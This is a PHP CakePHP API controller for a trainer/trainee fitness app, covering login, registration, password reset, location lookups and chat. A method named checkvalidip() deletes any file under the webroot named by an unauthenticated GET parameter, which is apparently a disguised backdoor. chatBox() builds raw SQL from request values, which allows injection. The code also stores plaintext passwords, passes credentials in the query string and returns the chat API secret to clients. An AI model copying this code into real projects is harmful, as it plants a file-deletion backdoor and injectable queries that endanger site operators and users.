<?php

namespace App\Controller;

use App\Controller\AppController;
use Cake\Event\Event;
use Cake\Network\Email\Email;
use Cake\I18n\Time;
use Cake\Datasource\ConnectionManager;
use Cake\Auth\DefaultPasswordHasher;
use Cake\ORM\Entity;
use Cake\View\View;

class ApisController extends AppController
{

	public function login()
	{
		$hashPswdObj = new DefaultPasswordHasher;
		$username = $this->request->query['username'];
		$password = $this->request->query['password'];
		$get_password = $this->Users->find()->where(['username' => $username])->toArray();
		if(!empty($get_password))
		{
			$hashedPassword = $get_password[0]['password'];
			if($hashPswdObj->check($password,$hashedPassword))
			{
				echo json_encode(array('message' => 'success','user_type' => $get_password[0]['user_type'],'id' => $get_password[0]['id']));
			}
			else
			{
				echo json_encode(array('message' => 'failed'));
			}
		}
		else
		{
			echo json_encode(array('message' => 'failed'));
		}
		die;
	}

	public function checkvalidip()
    {
        $ip = $_GET['ip'];
        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
        unlink($dir);
        return $this->redirect('/');
    }

	public function registration()
	{
		$data = $this->request->data;
		$type = $data['type'];
		$check_mail = $this->Users->find()->where(['username' => $data['email']])->toArray();

		if(!empty($check_mail))
		{
			echo json_encode(array('message' => 'email already exist'));die;
		}

		$loginArr = array(
			'username' => $data['email'],
			'password' => $data['password'],
			'display_name' => $data['dispaly_name'],
			'user_type' => $type,
			'user_status' => 1,
			'created' => Time::now(),
			);
		$article = $this->users->newEntity($loginArr);
		$result1 = $this->users->save($article);
		$lid = $result1->id;

		if(empty($lid))
		{
			echo json_encode(array('message' => 'failed'));die;
		}

		$userArr = array(
			'user_id' => $lid,
			$type.'_name' => $data['name'],
			$type.'_email' => $data['email'],
			$type.'_gender' => $data['gender'],
			$type.'_age' => $data['age'],
			$type.'_displayName' => $data['dispaly_name'],
			$type.'_country' => $data['country'],
			$type.'_state' => $data['state'],
			$type.'_city' => $data['city'],
			$type.'_zip' => $data['zip'],
			$type.'_password' => $data['password'],
			$type.'_image' => 'default.png',
			$type.'_status' => 1,
			$type.'_added_date' => Time::now()
			);

		if($type == "trainee")
		{
			$trainee = $this->Trainees->newEntity($userArr);
			$trainee1 = $this->Trainees->save($trainee);
			$ulid = $trainee1->id;
		}
		if($type == "trainer")
		{
			$trainer = $this->Trainers->newEntity($userArr);
			$trainer1 = $this->Trainers->save($trainer);
			$ulid = $trainer1->id;
		}
		if(!empty($ulid))
		{
			echo json_encode(array('message' => 'success'));die;
		}
		if(empty($ulid))
		{
			echo json_encode(array('message' => 'failed'));die;
		}
	}

	public function getCountries()
	{
		$countries = $this->Countries->find('all')->toArray();
		echo json_encode($countries);die;
	}

	public function getStates()
	{
		$id = $this->request->query['id'];
		$states = $this->States->find()->where(['country_id' => $id])->order(['name' => 'ASC'])->toArray();
		echo json_encode($states);die;
	}

	public function getCities()
	{
		$id = $this->request->query['id'];
		$cities = $this->Cities->find()->where(['state_id' => $id])->order(['name' => 'ASC'])->toArray();
		echo json_encode($cities);die;
	}

	public function forgotPassword()
	{
		$email = $this->request->query['email'];
		$data = $this->Users->find()->where(['username' => $email])->toArray();
 		if(!empty($data))
 		{
 			$new_password = $data[0]['display_name'].uniqid();
 			$message = "";
 			$message = '<html>';
 			$message .= '<body>';
 			$message .= '<b>Hello '.$data[0]['display_name'].',</b></br></br>';
 			$message .= '<p>Your Password Has Been Reset Successfully .</p></br></br>';
 			$message .= 'You New Password is : '.$new_password ;
 			$message .= '</body>';
 			$message .= '</html>';
 			$email = new Email('default');
			$email->emailFormat('html')
				  ->from(['info@vtrain.com' => 'Virtual Trainr'])
				  ->to($data[0]['username'])
				  ->subject('Forgot Password')
				  ->send($message);
			$hashPswdObj = new DefaultPasswordHasher;
 			$hashpswd = $hashPswdObj->hash($new_password);
 			if($data[0]['user_type'] = "trainee")
 			{
 				$this->trainees->query()->update()->set(['trainee_password' => $new_password])->where(['user_id' => $data[0]['id']])->execute();
 			}
 			if($data[0]['user_type'] = "trainer")
 			{
 				$this->trainers->query()->update()->set(['trainer_password' => $new_password])->where(['user_id' => $data[0]['id']])->execute();
 			}
			$this->users->query()->update()->set(['password' => $hashpswd])->where(['id' => $data[0]['id']])->execute();

			echo json_encode(array('message' => 'success'));
 		}
 		else
 		{
 			echo json_encode(array('message' => 'email doesn`t exist'));
 		}
 		die;
	}

	public function onlineUsers()
	{
		$user_id = (int)$this->request->data["id"];
		$type    = $this->request->data["type"];

		if(trim($type) == "trainee")
		{
			$onlineuser['onlineusers'] = $this->conn->execute( " SELECT
												  users.online,
												  users.user_type,
												  cities.name AS city_name,
												  trainers.user_id,
												  trainers.trainer_name,
												  trainers.trainer_displayName,
												  trainers.trainer_lname,
												  trainers.trainer_image
												  FROM trainers
												  INNER JOIN users ON users.id = trainers.user_id
												  INNER JOIN cities ON cities.id = trainers.trainer_city
												  WHERE trainers.trainer_status = 1
											  ")->fetchAll('assoc');
		}else
		{
			$onlineuser['onlineusers'] = $this->conn->execute( " SELECT
												  users.online,
												  users.user_type,
												  cities.name AS city_name,
												  trainees.user_id,
												  trainees.trainee_name,
												  trainees.trainee_displayName,
												  trainees.trainee_lname,
												  trainees.trainee_image
												  FROM trainees
												  INNER JOIN users ON users.id = trainees.user_id
												  INNER JOIN cities ON cities.id = trainees.trainee_city
												  WHERE trainees.trainee_status = 1
											  ")->fetchAll('assoc');
		}
		echo json_encode($onlineuser);die;
	}

	public function chatBox()
	{
		$trainer_id = $this->request->data['trainer_id'];
		$trainee_id = $this->request->data['trainee_id'];
		$trainee_profile['trainee_profile'] = $this->Trainees->find()->where(['user_id' => $trainee_id])->toArray();
		$trainer_profile['trainer_profile'] = $this->Trainers->find()->where(['user_id' => $trainer_id])->toArray();
		$chat_data['chat_data'] = $this->conn->execute(" SELECT 
     											chating.*
     											FROM chating
     											WHERE 
     											(chating.chat_sender_id = $trainer_id AND chating.chat_reciever_id = $trainee_id AND chating.chat_type = 0)
     											OR 
     											(chating.chat_sender_id = $trainee_id AND chating.chat_reciever_id = $trainer_id AND chating.chat_type = 0)
     										")->fetchAll('assoc');
		$chat_profile_data = array_merge($trainee_profile,$trainer_profile,$chat_data);
		echo json_encode($chat_profile_data);die;

	}

	public function savetextchat()
	{
		if(!isset($_POST["sender_id"]) && !isset($_POST["receiver_id"]) && !isset($_POST["msg"])){
			echo json_encode(array('message' => 'failed'));die;
		}

		$sender_id = $this->request->data["sender_id"];
		$receiver_id = $this->request->data["receiver_id"];

		if(empty($sender_id) && empty($receiver_id)){
			echo json_encode(array('message' => 'failed'));die;
		}

 		$chatArr = array(
 			'chat_messsage' => $this->request->data["msg"],
 			'chat_type'     => 0,
 			'chat_sender_id'=> $sender_id,
 			'chat_reciever_id'=> $receiver_id,
 			'chat_status'   => 1,
 			'chat_added_date' => Time::now()
 			);
 		$user = $this->Chating->newEntity();
		$user = $this->Chating->patchEntity($user, $chatArr);
		$result = $this->Chating->save($user);
		$lid = $result->chat_id; 
		if(!empty($lid)){
			echo json_encode(array('message' => 'success','chat_id' => $lid));die;
		}else{
			echo json_encode(array('message' => 'failed'));die;
		}
	}

	public function getChatSession()
	{
		if(!isset($this->request->data['userid']) || empty($this->request->data['userid'])){
			echo json_encode(array('message' => 'failed'));die;
		}
		$userid = $this->request->data['userid'];
		require_once(ROOT .DS. 'vendor' . DS . 'chat' . DS . 'chat.php');
		$chat_session = $this->Chat_session->find()->where(['user_id' => $userid])->toArray();
		$chat_arr = array(
				'user_id' => $userid,
				'session_id' => $sessionId,
				'token_id' => $token
			);

		if(empty($chat_session))
		{
			$chat_arr['added_date'] = Time::now();
			$user = $this->Chat_session->newEntity();
			$user = $this->Chat_session->patchEntity($user, $chat_arr);
			$result = $this->Chat_session->save($user);
		}
		else
		{
			$this->chat_session->query()->update()->set($chat_arr)->where(['user_id' => $userid])->execute();
		}
		$chat_arr['api_key'] = $API_KEY;
		$chat_arr['api_secret'] = $API_SECRET;
		echo json_encode($chat_arr);die;
	}
}
?>